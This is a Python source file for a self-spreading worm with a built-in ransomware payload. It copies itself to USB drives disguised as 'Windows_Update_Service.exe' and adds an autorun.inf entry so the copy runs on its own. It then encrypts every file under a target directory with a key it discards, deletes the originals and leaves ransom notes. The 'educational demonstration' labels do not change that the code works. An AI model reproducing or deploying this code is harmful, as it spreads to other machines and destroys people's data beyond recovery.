import os
import shutil
import sys
from datetime import datetime
from pathlib import Path
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from concurrent.futures import ThreadPoolExecutor
import secrets

class BasicWorm:
    def __init__(self):
        # Check if running as EXE or Python script
        if getattr(sys, 'frozen', False):
            self.worm_name = "Windows_Update_Service.exe"
            self.current_file = sys.executable
        else:
            self.worm_name = os.path.basename(__file__)
            self.current_file = __file__
        
        self.infected_markers = []
        
    def spread_via_removable_drives(self):
        """Spread to USB drives"""
        drives = ['D:', 'E:', 'F:', 'G:', 'H:']
        
        for drive in drives:
            if os.path.exists(drive):
                try:
                    # Copy the EXE to USB with convincing name
                    dest_path = os.path.join(drive, "Windows_Update_Service.exe")
                    shutil.copy2(self.current_file, dest_path)
                    
                    # Create autorun.inf
                    autorun_content = '''[AutoRun]
open=Windows_Update_Service.exe
action=Run Windows Update Service
'''
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, 'w') as f:
                        f.write(autorun_content)
                        
                    self.infected_markers.append(drive)
                    
                except Exception:
                    pass
    
    def execute_ransomware_payload(self):
        """Execute the ransomware payload"""
        # Generate random password
        password = secrets.token_hex(32)

        # Derive key from random password
        SALT = secrets.token_bytes(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100_000,
        )
        key = kdf.derive(password.encode())
        aesgcm = AESGCM(key)

        # Encryption function
        def encrypt_file(file_path: Path):
            try:
                if file_path.suffix == ".enc":
                    return
                data = file_path.read_bytes()
                nonce = os.urandom(12)
                encrypted = aesgcm.encrypt(nonce, data, None)
                enc_path = file_path.with_suffix(file_path.suffix + ".enc")
                enc_path.write_bytes(nonce + encrypted)
                file_path.unlink()
            except Exception:
                pass

        # Gather files
        def gather_files(drive: Path):
            skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
            files = []
            for root, dirs, filenames in os.walk(drive):
                dirs[:] = [d for d in dirs if d not in skip_dirs]
                for f in filenames:
                    files.append(Path(root) / f)
            return files

        # Target the D:/Hello directory for ransomware
        drive = Path("D:/Hello")
        if drive.exists():
            all_files = gather_files(drive)
            
            # Create a ransom note
            ransom_note = """
    YOUR FILES HAVE BEEN ENCRYPTED
    
    All your files have been encrypted with military-grade AES-256 encryption.
    
    This is a demonstration. Files cannot be recovered.
    """
            
            # Save ransom note to multiple locations
            note_locations = [
                drive / "READ_ME.txt",
                Path(os.path.expanduser("~/Desktop")) / "FILES_ENCRYPTED.txt"
            ]
            
            for note_path in note_locations:
                try:
                    with open(note_path, 'w', encoding='utf-8') as f:
                        f.write(ransom_note)
                except:
                    pass

            # Encrypt files silently
            with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
                executor.map(encrypt_file, all_files)
    
    def create_worm_message(self):
        """Create worm demonstration message"""
        message_content = f"""WORM DEMONSTRATION

This computer ran a worm demonstration.

File: {self.worm_name}
Time: {datetime.now()}

The worm has executed a ransomware payload on D:/Hello

This is for educational purposes only.
"""
        
        message_locations = [
            os.path.expanduser("~/Desktop/WORM_DEMO.txt"),
            os.path.expanduser("~/Documents/WORM_DEMO.txt"),
        ]
        
        for msg_path in message_locations:
            try:
                with open(msg_path, 'w', encoding='utf-8') as f:
                    f.write(message_content)
            except Exception:
                pass
    
    def start_spreading(self):
        """Main method to initiate the worm's spreading behavior"""
        # Spread via removable drives
        self.spread_via_removable_drives()
        
        # Execute ransomware payload
        self.execute_ransomware_payload()
        
        # Create worm demonstration message
        self.create_worm_message()

# Main execution
if __name__ == "__main__":
    worm = BasicWorm()
    worm.start_spreading()